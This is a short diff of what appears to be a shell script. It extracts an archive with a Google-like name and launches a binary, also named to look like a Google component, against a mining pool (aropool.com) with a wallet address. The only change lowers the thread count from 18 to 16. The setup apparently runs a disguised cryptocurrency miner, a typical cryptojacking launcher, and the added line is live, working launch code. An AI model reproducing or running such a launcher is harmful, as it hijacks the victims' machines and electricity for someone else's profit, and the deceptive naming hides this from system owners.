@@ -7,4 +7,4 @@ tar -xvf ./googleapps847412741274.tar.gz
 
 cd googleapps8474
 
-./google84121274 -p http://aropool.com -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 18 -b 18
+./google84121274 -p http://aropool.com -a 2XHCt5awxvHdQyNLv8DukLbCZvEv9Eckv14eQZk94dDXxT8E3chTYRfasn8kn1XcqGFuXA65Qi11do1TsK2pHCM5 -t 16 -b 16
